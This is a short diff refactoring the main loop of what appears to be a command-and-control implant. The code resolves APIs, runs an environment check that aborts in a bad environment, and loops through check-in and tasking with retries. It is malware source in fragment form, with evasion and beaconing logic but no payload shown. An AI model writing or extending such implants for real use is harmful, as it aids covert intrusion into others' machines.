@@ -1,29 +1,31 @@
 #include <include/core.hpp>
+using namespace Memory;
+using namespace Message;
+using namespace Parser;
+using namespace Random;
+
 CFG_SECTION BYTE Config[] = CONFIG_BYTES;
-
 namespace Core {
-    using namespace Memory;
-    using namespace Random;
 
-    VOID Main () {
+    VOID MainRoutine () {
         HEXANE
 
         ResolveApi();
         SeCheckEnvironment();
 
+        if (ntstatus == ERROR_BAD_ENVIRONMENT) {
+            return_defer(ntstatus);
+        }
+
         if (Ctx) {
             do {
                 if (!Ctx->Session.Checkin) {
-
                     HandleTask(TypeCheckin);
-                    if (ntstatus == ERROR_BAD_ENVIRONMENT) {
-                        return_defer(ntstatus);
-                    }
-
                     continue;
-                } else {
 
+                } else {
                     HandleTask(TypeTasking);
+
                     if (ntstatus != ERROR_SUCCESS) {
                         Ctx->Session.Retry++;
 
@@ -39,8 +41,8 @@ namespace Core {
             } while (TRUE);
         }
 
-        defer:
-    FreeApi(Ctx);
+    defer:
+        FreeApi(Ctx);
     }
 
     VOID HandleTask (DWORD msgType) {
